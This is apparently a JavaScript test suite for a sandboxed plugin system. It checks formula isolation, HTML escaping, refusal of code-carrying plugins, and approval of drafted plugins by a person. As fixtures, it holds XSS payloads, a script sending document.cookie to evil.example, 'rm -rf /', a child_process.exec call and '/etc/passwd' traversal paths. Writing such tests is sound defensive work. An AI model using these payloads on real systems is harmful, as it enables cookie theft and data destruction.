// Plugins (backend/plugins.mjs, shared/pluginTemplate.mjs) and the skills list (backend/skillRecords.mjs).
//
// The claim under test is the safety model in docs/10_SKILLS_AND_PLUGINS.md: a plugin is a form,
// formulas and a template, it contains no code, and everything it writes goes through the record
// pipeline. So the tests are mostly attempts to make it do something else.
import './_env.mjs';
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { tempRoots } from './_env.mjs';
import { req, freshRoot } from './helpers.mjs';
import { setStorageRoot, writeMd } from '../backend/store.mjs';
import { documentsFor, forgetParsed } from '../backend/documents.mjs';
import { readEvents } from '../backend/log.mjs';
import { evalExpr, parseExpr, renderTemplate, htmlTemplateProblems, PAGE_POLICY } from '../shared/pluginTemplate.mjs';
import { checkManifest, listPlugins, actionsFor } from '../backend/plugins.mjs';

const repo = path.dirname(path.dirname(fileURLToPath(import.meta.url)));
const STUB = path.join(repo, 'tests', 'fixtures', 'stub-brain.mjs');

// A private copy of the CRM showcase: real companies, deals with line items, an invoices collection.
function crm() {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'scout-plugins-'));
  tempRoots.push(root);
  fs.cpSync(path.join(repo, 'workspace-crm'), root, { recursive: true, filter: src => !path.basename(src).startsWith('._') });
  setStorageRoot(root);
  forgetParsed();
  return root;
}
const invoices = () => documentsFor('invoices').documents;
const deal = () => documentsFor('deals').documents.find(d => d.fields.line_items.length === 3);
const today = () => { const d = new Date(); return d.getFullYear() + '-' + String(d.getMonth() + 1).padStart(2, '0') + '-' + String(d.getDate()).padStart(2, '0'); };
const act = (step, body, plugin = 'invoice', action = 'create') => req('POST', '/api/plugins/' + plugin + '/actions/' + action + '/' + step, body);

// ── the language ─────────────────────────────────────────────────────────────────────────────
test('formulas do arithmetic over the record and nothing else', () => {
  const scope = { record: { amount: 1200, line_items: [{ quantity: 2, unit_price: 50 }, { quantity: 1, unit_price: 25.5 }] }, input: { rate: 10 } };
  assert.equal(evalExpr('record.amount * input.rate / 100', scope), 120);
  assert.equal(evalExpr('sum(record.line_items, item.quantity * item.unit_price)', scope), 125.5);
  assert.equal(evalExpr('round(1 / 3, 2)', scope), 0.33);
  assert.equal(evalExpr("add_days('2026-11-17', 14)", scope), '2026-12-01');
  assert.equal(evalExpr("if(record.amount > 1000, 'big', 'small')", scope), 'big');
  assert.equal(evalExpr("concat('INV-', year('2026-03-01'), '-', pad(7, 3))", scope), 'INV-2026-007');
  assert.equal(evalExpr('money(1234.5)', scope), '$1,234.50');
  assert.equal(evalExpr('record.missing.deeper', scope), null, 'a missing value is empty, never an error');
  assert.equal(evalExpr('record.amount / 0', scope), null);
});

test('a formula cannot reach outside its values', () => {
  const scope = { record: { name: 'x' } };
  // Own properties only: the prototype chain is not there to climb.
  for (const src of ['record.constructor', 'record.__proto__', 'record.constructor.constructor', 'record.name.constructor', 'record.toString']) {
    assert.equal(evalExpr(src, scope), null, src);
  }
  // Nothing that is not arithmetic, a name or a listed function even parses.
  for (const src of ['process.exit()', 'require("fs")', 'eval("1")', 'fetch("x")', 'record["name"]', '(() => 1)()', 'new Date()', 'a = 1', 'x; y', '`a`', 'import("fs")', 'this', 'globalThis.process']) {
    let value;
    try { value = evalExpr(src, scope); } catch (e) { assert.equal(e.name, 'PluginSyntaxError', src); continue; }
    assert.equal(value, null, src + ' evaluates to nothing');
  }
  assert.throws(() => parseExpr('x'.repeat(700)), /at most/);
});

test('a template escapes every value it prints and has no raw form', () => {
  const html = renderTemplate('<p>{{ record.name }}</p>{{#each rows}}<i>{{ index }}:{{ item.v }}</i>{{/each}}{{#if none}}no{{else}}yes{{/if}}',
    { record: { name: '<img src=x onerror=alert(1)>"\'&' }, rows: [{ v: 'a' }, { v: '</i><script>1</script>' }], none: [] });
  assert.equal(html, '<p>&lt;img src=x onerror=alert(1)&gt;&quot;&#39;&amp;</p><i>1:a</i><i>2:&lt;/i&gt;&lt;script&gt;1&lt;/script&gt;</i>yes');
  assert.throws(() => renderTemplate('{{#each rows}}never closed', {}), /never closed/);
  assert.throws(() => renderTemplate('{{{ record.name }}}', { record: {} }), /PluginSyntaxError|not something/);
});

test('an HTML template that could run code or load anything is refused, in words', () => {
  const bad = {
    '<script>alert(1)</script>': /script/,
    '<p onclick="x()">hi</p>': /on… attribute/,
    '<img src="https://evil.example/pixel.png">': /points at a file|internet address/,
    '<link rel="stylesheet" href="x.css">': /<link>/,
    '<style>@import "x.css";</style>': /imports a stylesheet/,
    '<div style="background:url(http://evil.example/x)">': /url\(/,
    '<a href="javascript:alert(1)">x</a>': /javascript:|points at/,
    '<iframe srcdoc="x"></iframe>': /embeds/,
    '<form><input name="card"></form>': /form control/,
    '<body><p>x</p></body>': /<html>, <head> or <body>/,
    '<p>see https://example.com/pay</p>': /internet address/,
  };
  for (const [html, why] of Object.entries(bad)) assert.match(htmlTemplateProblems(html).join(' | '), why, html);
  assert.deepEqual(htmlTemplateProblems('<style>.a{color:#111;background:#fff}</style><p class="a">{{ record.name }}</p><img src="data:image/png;base64,AAAA"><a href="mailto:{{ me.email }}">write</a>'), []);
});

// ── the reference plugin ─────────────────────────────────────────────────────────────────────
test('the invoice plugin is valid, and only offers its buttons where its collections exist', async () => {
  freshRoot(); forgetParsed();
  const bare = listPlugins().find(p => p.id === 'invoice');
  assert.deepEqual(bare.problems, []);
  assert.equal(bare.ready, false, 'an empty workspace has no deals to invoice');
  assert.deepEqual(bare.needs, ['a collection called "deals"', 'a collection called "invoices"']);
  assert.deepEqual(actionsFor('deals'), []);

  crm();
  const { status, body } = await req('GET', '/api/plugins');
  assert.equal(status, 200);
  const invoice = body.plugins.find(p => p.id === 'invoice');
  assert.equal(invoice.ready, true);
  assert.equal(invoice.source, 'built-in');
  assert.deepEqual(invoice.actions.map(a => a.on + ':' + a.label), ['deals:Create invoice', 'invoices:Print or save as PDF']);
  // The account of what it touches is worked out from the manifest, in plain words.
  assert.match(invoice.actions[0].reads.join(' · '), /Deals record you press it on · the company it links to · the person it links to · your details in me\.md/);
  assert.match(invoice.actions[0].writes[0], /^one new record in Invoices/);
  assert.deepEqual(invoice.actions[1].writes, []);
  assert.equal(body.ai.available, false, 'no model is claimed under test');
  const actions = (await req('GET', '/api/plugins/actions?collection=deals')).body.actions;
  assert.deepEqual(actions.map(a => a.label), ['Create invoice']);
});

test('prepare fills the form; preview draws the invoice and writes nothing', async () => {
  const root = crm();
  const d = deal();
  const form = (await act('prepare', { path: d.path })).body;
  const value = key => form.inputs.find(i => i.key === key).value;
  assert.equal(value('number'), 'INV-' + today().slice(0, 4) + '-' + (today().startsWith('2026') ? '026' : '001'), 'the next free number');
  assert.equal(value('date'), today());
  assert.equal(value('share'), 100);
  assert.equal(value('label'), d.title);
  assert.match(value('note'), /Bank transfer/, 'the payment note comes from me.md');

  const before = fs.readdirSync(path.join(root, 'data', 'invoices')).length;
  const input = Object.fromEntries(form.inputs.map(i => [i.key, i.value]));
  const { status, body } = await act('preview', { path: d.path, input });
  assert.equal(status, 200);
  assert.deepEqual(body.problems, []);
  assert.equal(body.creates.collection, 'invoices');
  assert.equal(body.creates.fields.amount, d.fields.amount);
  assert.equal(body.creates.fields.deal, d.slug);
  assert.equal(body.creates.fields.company, d.fields.company);
  assert.equal(body.creates.fields.status, 'draft');
  assert.equal(body.creates.fields.due_date, evalExpr('add_days(d, 14)', { d: today() }));
  // The page: the seller from me.md, the client from the linked company, every line, the total.
  assert.ok(body.html.includes(PAGE_POLICY), 'the page forbids scripts and network by policy');
  assert.ok(!/<script/i.test(body.html));
  assert.ok(body.html.includes('Lantern Studio'));
  const company = documentsFor('companies').documents.find(c => c.slug === d.fields.company);
  assert.ok(body.html.includes(company.title.replace('&', '&amp;')));
  for (const line of d.fields.line_items) assert.ok(body.html.includes(line.description.replace(/&/g, '&amp;')), line.description);
  assert.ok(body.html.includes('$' + d.fields.amount.toLocaleString('en-US') + '.00'));
  assert.equal(fs.readdirSync(path.join(root, 'data', 'invoices')).length, before, 'a preview is not a write');
});

test('run files a new invoice through the record pipeline, linked to the deal and its company', async () => {
  const root = crm();
  const d = deal();
  const number = 'INV-2099-001';
  const { status, body } = await act('run', { path: d.path, input: { number, date: '2026-11-17', label: 'Deposit', share: 50, terms: 30, tax_rate: 10, note: 'Thank you.' } });
  assert.equal(status, 200, JSON.stringify(body));
  assert.equal(body.record.verdict, 'store');
  forgetParsed();
  const made = invoices().find(i => i.title === number);
  assert.ok(made, 'the invoice is a record in Invoices');
  assert.equal(made.path, body.record.path);
  const half = d.fields.line_items.reduce((s, l) => s + Math.round(l.unit_price * 50) / 100, 0);
  assert.equal(made.fields.amount, Math.round(half * 1.1 * 100) / 100, 'half the deal plus 10% tax');
  assert.equal(made.fields.tax_rate, 10);
  assert.equal(made.fields.date, '2026-11-17');
  assert.equal(made.fields.due_date, '2026-12-17');
  assert.equal(made.fields.deal, d.slug);
  assert.equal(made.fields.company, d.fields.company);
  assert.equal(made.fields.status, 'draft');
  assert.equal(made.fields.label, 'Deposit');
  assert.equal(made.fields.line_items.length, 3);
  assert.match(made.fields.line_items[0].description, /\(50%\)$/);
  // Written by the one writer: provenance on the file, the plugin named in the log.
  assert.equal(made.fields.provenance, 'pipeline');
  assert.equal(made.fields.created_by, 'crystal');
  assert.equal(made.fields.proposed, undefined);
  const ev = readEvents({ target: made.path, type: 'store' })[0];
  assert.equal(ev.detail.via, 'plugin:invoice/create');
  const runs = (await req('GET', '/api/plugins/history')).body.runs;
  assert.deepEqual([runs[0].plugin, runs[0].action, runs[0].target], ['invoice', 'create', made.path]);
  // The note is the readable copy of the same lines.
  const note = fs.readFileSync(path.join(root, made.path), 'utf8');
  assert.match(note, /\| Item \| Qty \| Unit price \| Amount \|/);
  assert.match(note, /\*\*Total: \$/);

  // The same number again is refused in words — a plugin makes a new record, it never overwrites.
  const again = await act('run', { path: d.path, input: { number, date: '2026-11-17' } });
  assert.equal(again.status, 409);
  assert.match(again.body.error, /already exists in Invoices/);

  // And the stored invoice prints as the same document.
  const print = await act('preview', { path: made.path, input: {} }, 'invoice', 'print');
  assert.equal(print.status, 200);
  assert.equal(print.body.creates, null, 'printing writes nothing');
  assert.ok(print.body.html.includes(number));
  assert.ok(print.body.html.includes('Tax 10%'));
  assert.ok(print.body.html.includes('Lantern Studio'));
});

test('only a person runs a plugin, and a bad form is refused before anything is written', async () => {
  const root = crm();
  const d = deal();
  const before = fs.readdirSync(path.join(root, 'data', 'invoices')).length;
  const agent = await act('run', { path: d.path, input: { number: 'INV-2099-900', date: '2026-11-17' }, actor: 'some-agent' });
  assert.equal(agent.status, 403);
  assert.match(agent.body.error, /Only a person can run a plugin/);
  assert.equal((await act('run', { path: d.path, input: { number: 'INV-2099-901', date: 'tomorrow' } })).status, 400);
  assert.equal((await act('run', { path: d.path, input: { number: 'INV-2099-902', share: 'half' } })).status, 400);
  assert.equal((await act('run', { path: d.path, input: { number: '' } })).status, 409, 'no number, no record');
  assert.equal((await act('run', { path: 'data/companies/brightloom-coffee.md', input: {} })).status, 404, 'a company is not a deal');
  assert.equal((await act('run', { path: '../../etc/passwd', input: {} })).status, 404);
  assert.equal((await act('run', { path: d.path, input: {} }, 'invoice', 'nope')).status, 404);
  assert.equal(fs.readdirSync(path.join(root, 'data', 'invoices')).length, before);
});

test('a hostile value in a record is printed as text', async () => {
  const root = crm();
  writeMd(path.join(root, 'data', 'deals', 'deal-900-hostile.md'), {
    name: '<script>alert(1)</script> — Evil', stage: 'won', amount: 100, company: 'brightloom-coffee', person: '', provenance: 'pipeline', created_by: 'crystal',
    line_items: [{ description: '<img src=x onerror=alert(2)>', quantity: 1, unit_price: 100 }],
  }, '');
  forgetParsed();
  const { status, body } = await act('preview', { path: 'data/deals/deal-900-hostile.md', input: { number: 'INV-2099-950', date: '2026-11-17' } });
  assert.equal(status, 200);
  assert.ok(!/<script/i.test(body.html) && !/<img/i.test(body.html));
  assert.ok(body.html.includes('&lt;img src=x onerror=alert(2)&gt;'));
});

test('a plugin folder that tries to carry code is listed with what is wrong and offers no button', async () => {
  const root = crm();
  const dir = path.join(root, 'plugins', 'sneaky');
  fs.mkdirSync(dir, { recursive: true });
  writeMd(path.join(dir, 'plugin.md'), { id: 'sneaky', name: 'Sneaky', actions: [{ id: 'go', on: 'deals', label: 'Go', template: 'page.html', compute: [{ key: 'x', value: 'process.env.HOME' }, { key: 'y', value: 'require("fs")' }] }] }, '');
  fs.writeFileSync(path.join(dir, 'page.html'), '<p>{{ record.name }}</p><script>fetch("https://evil.example/" + document.cookie)</script>');
  fs.writeFileSync(path.join(dir, 'run.js'), 'require("child_process").exec("open -a Calculator")');
  const sneaky = (await req('GET', '/api/plugins')).body.plugins.find(p => p.id === 'sneaky');
  assert.equal(sneaky.ready, false);
  const said = sneaky.problems.join(' | ');
  assert.match(said, /<script>/);
  assert.match(said, /"process", which nothing defines/);
  assert.match(said, /"require" is not a function a plugin can use/);
  assert.ok(!sneaky.files.some(f => f.name === 'run.js'), 'a .js file in the folder is not part of the plugin at all');
  assert.ok(!actionsFor('deals').some(a => a.plugin === 'sneaky'));
  const run = await act('run', { path: deal().path, input: {} }, 'sneaky', 'go');
  assert.equal(run.status, 409);
  // A workspace folder cannot shadow a built-in plugin either.
  fs.cpSync(path.join(repo, 'plugins', 'invoice'), path.join(root, 'plugins', 'invoice'), { recursive: true });
  const both = (await req('GET', '/api/plugins')).body.plugins.filter(p => p.id === 'invoice');
  assert.equal(both.length, 2);
  assert.match(both.find(p => p.source === 'workspace').problems.join(), /built-in plugin already has the id/);
});

test('checkManifest keeps only what it knows and names what is missing', () => {
  const { manifest, problems } = checkManifest({ id: 'Quote Maker', kind: 'script', surprise: 'x', actions: [{ id: 'make', on: 'deals', label: 'Make', template: 'q.html', run: 'rm -rf /', creates: { collection: 'quotes', fields: { name: 'nope.x' } } }] }, {});
  assert.equal(manifest.surprise, undefined);
  assert.equal(manifest.actions[0].run, undefined, 'a key the format does not have does not exist');
  const said = problems.join(' | ');
  assert.match(said, /the id must be lowercase/);
  assert.match(said, /kind "script" is not supported/);
  assert.match(said, /q\.html, which is not in the folder/);
  assert.match(said, /uses "nope", which nothing defines/);
});

// ── "Create a plugin" ────────────────────────────────────────────────────────────────────────
const GENERATED = {
  id: 'deal-summary', name: 'Deal summary', description: 'A one-page summary of a deal.',
  actions: [{ id: 'show', on: 'deals', label: 'Deal summary', template: 'summary.html',
    reads: { client: 'record.company' },
    compute: [{ key: 'total', value: 'sum(record.line_items, item.quantity * item.unit_price)' }] }],
  files: { 'summary.html': '<h1>{{ record.title }}</h1><p>{{ client.name }} · {{ money(total) }}</p>' },
};
function withModel(reply, fn) {
  const file = path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'scout-brain-')), 'reply.txt');
  tempRoots.push(path.dirname(file));
  fs.writeFileSync(file, reply);
  process.env.SCOUT_BRAIN_COMMAND = STUB;
  process.env.SCOUT_BRAIN_REPLY_FILE = file;
  return fn().finally(() => { delete process.env.SCOUT_BRAIN_COMMAND; delete process.env.SCOUT_BRAIN_REPLY_FILE; });
}

test('with no model connected, creating a plugin says so — and a copy still works', async () => {
  crm();
  const none = await req('POST', '/api/plugins/draft', { description: 'Make a one-page summary of a deal for the client.' });
  assert.equal(none.status, 503);
  assert.equal(none.body.code, 'no-model');
  assert.match(none.body.error, /No model is available/);
  assert.equal((await req('POST', '/api/plugins/draft', { description: 'short' })).status, 400);
  const copy = await req('POST', '/api/plugins/draft', { from: 'invoice', name: 'Quote' });
  assert.equal(copy.status, 200, JSON.stringify(copy.body));
  assert.equal(copy.body.id, 'quote');
  assert.equal(copy.body.source, 'draft');
  assert.deepEqual(copy.body.problems, []);
  assert.ok(!actionsFor('deals').some(a => a.plugin === 'quote'), 'a draft adds no button');
});

test('a model writes a draft; it does nothing until a person approves it', async () => {
  const root = crm();
  await withModel('Here you go:\n```json\n' + JSON.stringify(GENERATED) + '\n```', async () => {
    assert.equal((await req('GET', '/api/plugins')).body.ai.available, true);
    const agent = await req('POST', '/api/plugins/draft', { description: 'Make a one-page summary of a deal for the client.', actor: 'some-agent' });
    assert.equal(agent.status, 403, 'an agent does not create plugins');
    const made = await req('POST', '/api/plugins/draft', { description: 'Make a one-page summary of a deal for the client.' });
    assert.equal(made.status, 200, JSON.stringify(made.body));
    assert.equal(made.body.id, 'deal-summary');
    assert.equal(made.body.source, 'draft');
    assert.equal(made.body.drafted_by, 'stub');
    assert.match(made.body.request, /one-page summary/);
    assert.deepEqual(made.body.actions[0].writes, [], 'what it writes is read from the manifest: nothing');
  });
  assert.ok(fs.existsSync(path.join(root, 'plugins', '_drafts', 'deal-summary', 'summary.html')));
  const listed = (await req('GET', '/api/plugins')).body;
  assert.ok(listed.drafts.some(p => p.id === 'deal-summary'));
  assert.ok(!listed.plugins.some(p => p.id === 'deal-summary'));
  assert.ok(!actionsFor('deals').some(a => a.plugin === 'deal-summary'));
  // It can be LOOKED at before approval, never run.
  const d = deal();
  const look = await act('preview', { path: d.path, input: {} }, 'deal-summary', 'show');
  assert.equal(look.status, 200);
  assert.ok(look.body.html.includes('$' + d.fields.amount.toLocaleString('en-US') + '.00'));
  assert.equal((await act('run', { path: d.path, input: {} }, 'deal-summary', 'show')).status, 404);

  assert.equal((await req('POST', '/api/plugins/drafts/deal-summary/approve', { actor: 'some-agent' })).status, 403);
  const ok = await req('POST', '/api/plugins/drafts/deal-summary/approve', {});
  assert.equal(ok.status, 200, JSON.stringify(ok.body));
  assert.equal(ok.body.source, 'workspace');
  assert.equal(ok.body.ready, true);
  assert.ok(fs.existsSync(path.join(root, 'plugins', 'deal-summary', 'plugin.md')));
  assert.ok(!fs.existsSync(path.join(root, 'plugins', '_drafts', 'deal-summary')));
  assert.deepEqual(actionsFor('deals').map(a => a.label).sort(), ['Create invoice', 'Deal summary']);
  assert.equal((await act('run', { path: d.path, input: {} }, 'deal-summary', 'show')).status, 200);
  // Removing it needs a reason and moves the folder aside; nothing is deleted.
  assert.equal((await req('POST', '/api/plugins/deal-summary/remove', {})).status, 400);
  const gone = await req('POST', '/api/plugins/deal-summary/remove', { reason: 'not needed' });
  assert.equal(gone.status, 200);
  assert.ok(fs.existsSync(path.join(root, gone.body.archived, 'summary.html')));
  assert.equal((await req('POST', '/api/plugins/invoice/remove', { reason: 'x' })).status, 409, 'built-in plugins stay');
});

test('a model that writes code into a plugin is turned down, and nothing lands on disk', async () => {
  const root = crm();
  const evil = { ...GENERATED, id: 'evil', files: { 'summary.html': '<h1>{{ record.title }}</h1><script>fetch("https://evil.example")</script>' } };
  await withModel(JSON.stringify(evil), async () => {
    const made = await req('POST', '/api/plugins/draft', { description: 'Make a one-page summary of a deal for the client.' });
    assert.equal(made.status, 422);
    assert.match(made.body.error, /cannot be used/);
    assert.match(made.body.problems.join(' | '), /<script>/);
  });
  assert.ok(!fs.existsSync(path.join(root, 'plugins', '_drafts', 'evil')));
  await withModel('I would rather chat about it.', async () => {
    assert.equal((await req('POST', '/api/plugins/draft', { description: 'Make a one-page summary of a deal for the client.' })).status, 422);
  });
});

// ── skills ───────────────────────────────────────────────────────────────────────────────────
test('the skills list shows what is on disk: built in and this workspace, with what each names', async () => {
  crm();
  const { status, body } = await req('GET', '/api/skills/list');
  assert.equal(status, 200);
  const ids = body.skills.map(s => s.id);
  assert.ok(ids.includes('app/scout-router') && ids.includes('workspace/follow-up'), ids.join());
  const follow = body.skills.find(s => s.id === 'workspace/follow-up');
  assert.deepEqual(follow.reads.map(c => c.label), ['People', 'Messages', 'Deals']);
  assert.deepEqual(follow.writes.map(c => c.id), ['messages']);
  assert.equal(follow.schedule.declared, 'daily');
  assert.equal(follow.schedule.assistant.name, 'Follow-up');
  assert.equal(follow.schedule.automatic_runs_on, false, 'automatic runs are off unless switched on in Settings');
  const one = (await req('GET', '/api/skills/read?id=workspace/follow-up')).body;
  assert.match(one.body, /## Where to look/);
  assert.equal((await req('GET', '/api/skills/read?id=workspace/nope')).status, 404);
  assert.equal((await req('GET', '/api/skills/read?id=elsewhere/follow-up')).status, 404);
  for (const p of ['../../me.md', '../../../etc/passwd', '/etc/passwd']) {
    const r = await req('GET', '/api/skills/text?id=workspace/follow-up&path=' + encodeURIComponent(p));
    assert.ok(r.status === 400 || r.status === 404, p + ' → ' + r.status);
  }
});
